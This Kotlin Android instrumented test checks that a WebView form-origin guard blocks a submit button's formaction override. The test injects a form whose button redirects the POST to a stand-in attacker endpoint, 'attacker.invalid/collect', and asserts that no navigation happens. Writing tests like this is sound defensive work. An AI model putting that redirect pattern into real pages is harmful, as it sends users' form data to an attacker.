package com.example.core.security

import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.test.core.app.ActivityScenario
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.webkit.WebViewCompat
import androidx.webkit.WebViewFeature
import com.example.MainActivity
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

@RunWith(AndroidJUnit4::class)
class SafeWebViewFormOriginGuardInstrumentedTest {

    @Test
    fun submitterFormActionCannotOverrideTheValidatedFormOrigin() {
        val scenario = ActivityScenario.launch(MainActivity::class.java)
        val completed = CountDownLatch(1)
        val finalUrl = AtomicReference<String?>()
        val failure = AtomicReference<Throwable?>()

        try {
            scenario.onActivity { activity ->
                val webView = WebView(activity)
                webView.settings.javaScriptEnabled = true

                if (!WebViewFeature.isFeatureSupported(WebViewFeature.DOCUMENT_START_SCRIPT)) {
                    failure.set(AssertionError("Document-start JavaScript is required for the POST origin guard"))
                    completed.countDown()
                    return@onActivity
                }

                try {
                    WebViewCompat.addDocumentStartJavaScript(
                        webView,
                        buildMainFrameFormOriginGuard("https://example.com/"),
                        setOf("*")
                    )
                } catch (error: Throwable) {
                    failure.set(error)
                    completed.countDown()
                    return@onActivity
                }

                webView.webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView, url: String?) {
                        view.evaluateJavascript(
                            """
                            (function () {
                                const form = document.createElement('form');
                                form.method = 'POST';
                                form.action = 'https://example.com/allowed';
                                const submit = document.createElement('button');
                                submit.type = 'submit';
                                submit.setAttribute('formaction', 'https://attacker.invalid/collect');
                                submit.textContent = 'submit';
                                form.appendChild(submit);
                                document.body.appendChild(form);
                                submit.click();
                                return window.location.href;
                            })();
                            """.trimIndent()
                        ) {
                            // A rejected POST must not navigate. Wait beyond the next
                            // navigation task so a bypass cannot pass on an early snapshot.
                            view.postDelayed({
                                view.evaluateJavascript("window.location.href") { rawUrl ->
                                    finalUrl.set(rawUrl)
                                    completed.countDown()
                                }
                            }, 750L)
                        }
                    }
                }

                webView.loadDataWithBaseURL(
                    "https://example.com/",
                    "<!doctype html><html><head><title>guard-test</title></head><body></body></html>",
                    "text/html",
                    "UTF-8",
                    null
                )
            }

            assertTrue(
                "Timed out while exercising the POST submitter override in WebView",
                completed.await(12, TimeUnit.SECONDS)
            )
            failure.get()?.let { throw AssertionError("WebView POST guard instrumentation failed", it) }
            assertEquals(
                "\"https://example.com/\"",
                finalUrl.get()
            )
        } finally {
            scenario.close()
        }
    }
}
